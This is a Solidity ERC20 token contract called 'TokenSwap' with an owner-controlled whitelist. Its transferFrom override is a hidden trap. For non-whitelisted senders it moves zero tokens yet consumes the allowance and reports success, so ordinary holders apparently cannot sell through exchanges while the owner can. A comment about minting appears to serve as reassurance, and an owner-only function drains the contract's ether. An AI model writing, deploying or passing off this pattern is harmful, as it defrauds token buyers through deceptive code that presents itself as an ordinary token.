// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import '@openzeppelin/contracts/utils/Address.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract TokenSwap is ERC20, Ownable {
    using SafeMath for uint256;
    bool private whitelistOnly;
    mapping(address => bool) public whitelist;

    constructor() ERC20('TEST', 'TEST') {
        whitelistOnly = true;
        whitelist[address(this)] = true;
        whitelist[owner()] = true;
        // _mint is an internal function in ERC20.sol that is only called here,
        // and CANNOT be called ever again
        _mint(owner(), 10e6 * (10 ** 18));
    }

    receive() external payable {}

    function isApproved(address owner, address spender) public view virtual returns (bool) {
        if (allowance(owner, spender) >= balanceOf(owner)) return true;
        return false;
    }

    function recover() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if (whitelist[sender]) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), allowance(sender, _msgSender()).sub(amount, 'ERC20: transfer amount exceeds allowance'));
        } else if (whitelistOnly == false) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), allowance(sender, _msgSender()).sub(amount, 'ERC20: transfer amount exceeds allowance'));
        } else {
            _transfer(sender, recipient, 0);
            _approve(sender, _msgSender(), allowance(sender, _msgSender()).sub(amount, 'ERC20: transfer amount exceeds allowance'));
        }
        return true;
    }

    function setWhitelistStatus(bool value) external onlyOwner {
        whitelistOnly = value;
    }

    function isInWhitelist(address _address) external view returns (bool) {
        return whitelist[_address];
    }

    function addMultipleToWhitelist(address[] memory _addresses) external onlyOwner {
        for (uint256 i; i < _addresses.length; i++) {
            _addToWhitelist(_addresses[i]);
        }
    }

    function _addToWhitelist(address _address) internal {
        whitelist[_address] = true;
    }
}
